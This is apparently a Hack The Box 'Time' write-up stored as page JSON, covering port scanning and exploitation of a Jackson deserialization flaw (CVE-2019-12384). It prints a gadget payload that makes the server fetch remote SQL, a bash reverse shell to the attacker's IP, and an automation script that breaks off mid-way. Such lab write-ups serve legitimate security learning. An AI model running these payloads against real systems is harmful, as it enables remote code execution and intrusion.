{"componentChunkName":"component---src-templates-post-tsx","path":"/blog/writeups/htb-time/","result":{"data":{"markdownRemark":{"html":"<p>A rather short medium box - initial foothold using an older CVE that could take a little time to find, final privesc using a script root runs for us. Considering all of this it was still an interesting machine.</p>\n<h2 id=\"table-of-contents\" style=\"position:relative;\"><a href=\"#table-of-contents\" aria-label=\"table of contents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>table of contents</h2>\n<ul>\n<li><a href=\"#table-of-contents\">table of contents</a></li>\n<li>\n<p><a href=\"#recon\">recon</a></p>\n<ul>\n<li><a href=\"#nmap\">nmap</a></li>\n<li><a href=\"#web-server\">web server</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#foothold\">foothold</a></p>\n<ul>\n<li><a href=\"#cves\">cves</a></li>\n<li><a href=\"#description\">description</a></li>\n<li><a href=\"#exploit\">exploit</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#enumeration\">enumeration</a></p>\n<ul>\n<li><a href=\"#linpeas\">linpeas</a></li>\n</ul>\n</li>\n<li><a href=\"#privesc\">privesc</a></li>\n<li><a href=\"#further-reading\">further reading</a></li>\n</ul>\n<h2 id=\"recon\" style=\"position:relative;\"><a href=\"#recon\" aria-label=\"recon permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>recon</h2>\n<h3 id=\"nmap\" style=\"position:relative;\"><a href=\"#nmap\" aria-label=\"nmap permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>nmap</h3>\n<p>First things first, as always, I kicked off an extensive port scan:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"bash\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">sudo nmap -vv -A -oA nmap/top 10.10.10.214</span></span></span></code></pre>\n<pre class=\"grvsc-container abyss\" data-language=\"txt\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"># Nmap 7.91 scan initiated Thu Feb 18 22:36:18 2021 as: nmap -vv -A -oA nmap/top 10.10.10.214</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Increasing send delay for 10.10.10.214 from 0 to 5 due to 46 out of 151 dropped probes since last increase.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Nmap scan report for 10.10.10.214</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Host is up, received echo-reply ttl 63 (0.15s latency).</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Scanned at 2021-02-18 22:36:19 CET for 175s</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Not shown: 998 closed ports</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Reason: 998 resets</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">PORT   STATE SERVICE REASON         VERSION</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">| ssh-hostkey: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqO75jA9cYksdPP+eBZBYzvJERbVfExL7kXpMJQpmpHoJdl9EG/wSsXgEH4BXsa56Rv2i32ClI7QvykILEpL6JyhHi3xS8vlNud8CQCYCYNCiBzpa84ucBbLpFaR331qH3n1PNrlBjvH0g4jmlQjlKMHRNSjxOS5XjO3JMYFhBkI3tZKXuo9dg/0wHwXXbGa5gFihkrTkGqinaPRACYC8FCgQ3UUpUzjTUUwSLMMMMAUJX+WkqPiD3++VCSmQmJn4rtOQK2PNzesJQFrHk5BLj6J2gfLUkgvVu2dMVCYAJ8Pom+sYRLq5dkBdaXugjpFXGWFXxYjh57h21HVtkdAVyObBu4iNlZQNYNPpYKuLbmTKdEv86FMfw/g1ZasV1q53gEc4vWyWVQSkarHXPyMYTY1nsFEIvkhGl8CsuwS0HioWaBRsF/+jQF+5Zty43VWJuu+PanAIOelmxAHrfNm//XrIW7RjqCLEDj0MpUeK4KUMx7WPuyE10zpESpuqhtAU=</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCY27npy127v6WaSs6QO9MlX1RCjlp8ceQ0UyP6SfI+Q7UZrmg0qLFANnuqkm8iNio+TLTTOIAv5itdE0ahgzgE=</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|   256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFy9CB1oSRwsAZJb6AMVD7/T0qxBk2G7/hV2Db57c0Kj</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">| http-methods: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|_  Supported Methods: GET HEAD POST OPTIONS</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|_http-server-header: Apache/2.4.41 (Ubuntu)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">|_http-title: Online JSON parser</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">TCP/IP fingerprint:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:SCAN(V=7.91%E=4%D=2/18%OT=22%CT=1%CU=36205%PV=Y%DS=2%DC=T%G=Y%TM=602EDE8</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:3%P=x86_64-unknown-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:)SEQ(SP=FE%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DN</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Uptime guess: 11.370 days (since Sun Feb  7 13:45:44 2021)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Network Distance: 2 hops</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">TCP Sequence Prediction: Difficulty=254 (Good luck!)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">IP ID Sequence Generation: All zeros</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">TRACEROUTE (using port 5900/tcp)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">HOP RTT       ADDRESS</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">1   561.66 ms 10.10.14.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2   503.90 ms 10.10.10.214</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Read data files from: /usr/bin/../share/nmap</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"># Nmap done at Thu Feb 18 22:39:15 2021 -- 1 IP address (1 host up) scanned in 176.53 seconds</span></span></code></pre>\n<p>... SSH is listening on port 22 and Apache on 80 - not too extraordinary. A full scan didn't present any more open ports.</p>\n<h3 id=\"web-server\" style=\"position:relative;\"><a href=\"#web-server\" aria-label=\"web server permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>web server</h3>\n<p>Visiting the website, we are greeted by an \"Online JSON Beautifier &#x26; Validator\":</p>\n<div align=\"center\">\n    <span class=\"gatsby-resp-image-wrapper\" style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 650px; \">\n      <a class=\"gatsby-resp-image-link\" href=\"/static/db4b92887f82be7801ba2aa8e294a306/f705e/web-landing.png\" style=\"display: block\" target=\"_blank\" rel=\"noopener\">\n    <span class=\"gatsby-resp-image-background-image\" style=\"padding-bottom: 59.50920245398773%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsSAAALEgHS3X78AAACG0lEQVQoz33P20vTcRjH8d91wfoDwnUdUV3bxdzcye2nqwSjLA27iBCli4puMggS6qYunGu5mac8W5vHPFCZlJlmiRdFF0Ih2bb0h/Ow5ql33y0P+4HzgRfPF57nA89XGk17QFK6JPbISH36MpIyOHe3R0ZqTHeTqEloSHPRavcyM/wd5VuIuS9BlJivQYIfp/Hn1FKvc9FkVGdjpHKjB6dQHufFZarEqffgddSyGllnPhLmw/gob0feMbeoEKu6882U6Sriu65YJoF0y+hiS4nxEbdNbkr0bu45aliajRCN/mFyYpKJzxMsLIRZXV6j7EIbd9KqKLXUctdUoyIVmSooFoo2FZs9FBrc3DhZjRJaYG19lZ36y+J8hNL8Dq4a6rhubeCaRU3KMz8hUb6litz0Sq5k1xP4qfA7FCQwE4gLBn4xG5rnZsEL8tKbuJTRSoG1RUXKstaRyCHYxelns5sJiAuXWWFxY4UoG8RuDS+tcPliH7LpGaftPk7Z1CRdRiMqtkZOmJ4in/MT+jSN8nCAOdcgyuMhlPu9hMd/kFvYT6rRh17uRmfvFLq2ScdsrSQ6bm/jiKWF1Jx2BvunGKse432VIPqIZ4ThgSnMBT0cNov9zF6OymqSVvaxK/GdlCw/h3K6d5zpQetoj8+08nNSMrs4mPVKeLlNOpDZye660MidaGwdaOybYm/5/2xrb7/jNfscQ8KbeP8H5apu2oKqi68AAAAASUVORK5CYII='); background-size: cover; display: block;\"></span>\n  <img class=\"gatsby-resp-image-image\" alt=\"web landing\" title=\"web landing\" src=\"/static/db4b92887f82be7801ba2aa8e294a306/a6d36/web-landing.png\" srcset=\"/static/db4b92887f82be7801ba2aa8e294a306/222b7/web-landing.png 163w,\n/static/db4b92887f82be7801ba2aa8e294a306/ff46a/web-landing.png 325w,\n/static/db4b92887f82be7801ba2aa8e294a306/a6d36/web-landing.png 650w,\n/static/db4b92887f82be7801ba2aa8e294a306/e548f/web-landing.png 975w,\n/static/db4b92887f82be7801ba2aa8e294a306/3c492/web-landing.png 1300w,\n/static/db4b92887f82be7801ba2aa8e294a306/f705e/web-landing.png 2998w\" sizes=\"(max-width: 650px) 100vw, 650px\" style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\" loading=\"lazy\">\n  </a>\n    </span>\n</div>\n<p>... while the <code>Beautify</code> mode doesn't seem too interesting, the <code>Validate (beta!)</code> option, on the other hand, seems to be all the more promising. Simply entering <code>{}</code> already gives us some useable output:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"txt\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object</span></span></code></pre>\n<p>... this tells us that whatever JSON we enter will most likely be parsed by the <code>com.fasterxml.jackson</code> Java library in the backend. Let's go find ourselves a CVE, shall we?</p>\n<h2 id=\"foothold\" style=\"position:relative;\"><a href=\"#foothold\" aria-label=\"foothold permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>foothold</h2>\n<h3 id=\"cves\" style=\"position:relative;\"><a href=\"#cves\" aria-label=\"cves permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>cves</h3>\n<p>Okay, I have to admit, it take me quite some time to finally discover the right CVE, since there were quite a lot of similar ones out there ... ^^</p>\n<p>Anyway, simply <a href=\"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=fasterxml\">searching MITRE</a> for a term like <code>fasterxml</code> will return quite many results. This is cool and all, but trying many of them by hand is rather tedious. So... I narrowed it down a bit by searching this <em>awesome</em> list of <a href=\"https://github.com/qazbnm456/awesome-cve-poc\">CVE POCs</a> instead. And ... the first one, <a href=\"https://github.com/qazbnm456/awesome-cve-poc#cve-2019-12384\">CVE-2019-12384</a>, already worked!</p>\n<h4 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>description</h4>\n<p>For purposes of learning and not being a script kiddie, I took a closer look at what the exploit is actually doing and why it works. Here's a short summary.</p>\n<p>The first part of the epxloit the one actually abusing a Jackson deserialization flaw makes use of the \"gadget\" <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> which can be passed a JDBC URL in its <em>\"url\"</em> attribute:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"json\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk11\">&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;</span><span class=\"mtk1\">, {</span><span class=\"mtk15 mtki\">&quot;url&quot;</span><span class=\"mtk1\">:</span><span class=\"mtk11\">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.206:8000/inject.sql&#39;&quot;</span><span class=\"mtk1\">}]</span></span></span></code></pre>\n<p>... if the Jackson deserializer is used with <em>default typing</em> enabled, the <code>DriverManagerConnectionSource</code> will be initialized with the given JDBC URL, which will in turn download and execute the <code>inject.sql</code> script from the attacking machine.</p>\n<p>Because the database in question is the <code>H2</code> database, we can abuse its <code>CREATE ALIAS</code> to define and execute a Java function that opens up a reverse shell - the <code>inject.sql</code> could look something like ...</p>\n<pre class=\"grvsc-container abyss\" data-language=\"sql\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">CREATE</span><span class=\"mtk1\"> ALIAS SHELLEXEC </span><span class=\"mtk7\">AS</span><span class=\"mtk1\"> $$ String shellexec(String cmd) throws </span><span class=\"mtk4\">java</span><span class=\"mtk1\">.</span><span class=\"mtk4\">io</span><span class=\"mtk1\">.IOException {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">String[] command </span><span class=\"mtk7\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk11\">&quot;bash&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">&quot;-c&quot;</span><span class=\"mtk1\">, cmd};</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">java</span><span class=\"mtk1\">.</span><span class=\"mtk4\">util</span><span class=\"mtk1\">.Scanner s </span><span class=\"mtk7\">=</span><span class=\"mtk1\"> new </span><span class=\"mtk4\">java</span><span class=\"mtk1\">.</span><span class=\"mtk4\">util</span><span class=\"mtk1\">.Scanner(</span><span class=\"mtk4\">Runtime</span><span class=\"mtk1\">.</span><span class=\"mtk4\">getRuntime</span><span class=\"mtk1\">().</span><span class=\"mtk7\">exec</span><span class=\"mtk1\">(command).getInputStream()).useDelimiter(</span><span class=\"mtk11\">&quot;\\\\A&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">s</span><span class=\"mtk1\">.</span><span class=\"mtk4\">hasNext</span><span class=\"mtk1\">() ? </span><span class=\"mtk4\">s</span><span class=\"mtk1\">.</span><span class=\"mtk4\">next</span><span class=\"mtk1\">() : </span><span class=\"mtk11\">&quot;&quot;</span><span class=\"mtk1\">;  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">$$;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">CALL</span><span class=\"mtk1\"> SHELLEXEC(</span><span class=\"mtk11\">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.206/1337 0&gt;&amp;1&#39;</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<h3 id=\"exploit\" style=\"position:relative;\"><a href=\"#exploit\" aria-label=\"exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit</h3>\n<p>To make exploitation simpler and easier to repeat, I decided to write a little bash script that would automate execution:</p>\n<pre class=\"grvsc-container abyss\" data-language=\"bash\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">#!/bin/bash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">LHOST=</span><span class=\"mtk11\">&quot;10.10.14.206&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">LPORT=1337</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">WPORT=8000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">PAYLD=</span><span class=\"mtk11\">&quot;inject.sql&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">if</span><span class=\"mtk1\"> [[ $# </span><span class=\"mtk7\">-lt</span><span class=\"mtk1\"> 1 ]]</span><span class=\"mtk7\">;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">then</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk11\">&quot;Usage: $0 &lt;target-url&gt;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">exit</span><span class=\"mtk1\"> 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">fi</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">if</span><span class=\"mtk1\"> [[ $# </span><span class=\"mtk7\">-ge</span><span class=\"mtk1\"> 2 ]]</span><span class=\"mtk7\">;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">then</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    LPORT=$2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">fi</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">if</span><span class=\"mtk1\"> [[ </span><span class=\"mtk7\">!</span><span class=\"mtk1\"> </span><span class=\"mtk7\">-d</span><span class=\"mtk1\"> </span><span class=\"mtk11\">&quot;exploit&quot;</span><span class=\"mtk1\"> ]]</span><span class=\"mtk7\">;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">then</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    mkdir exploit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">fi</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">cd</span><span class=\"mtk1\"> exploit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">echo</span><span class=\"mtk1\"> </span><span class=\"mtk11\">&#39;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\\\A&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">return s.hasNext() ? s.next() : &quot;&quot;;  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">$$;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">CALL SHELLEXEC(&#39;&quot;&#39;bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1&#39;)&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">&gt;</span><span class=\"mtk1\"> inject.sql</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">/usr/bin/env python3 -m http.server $WPORT </span><span class=\"mtk7\">&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pypid=$!</span></span></span>\n<span 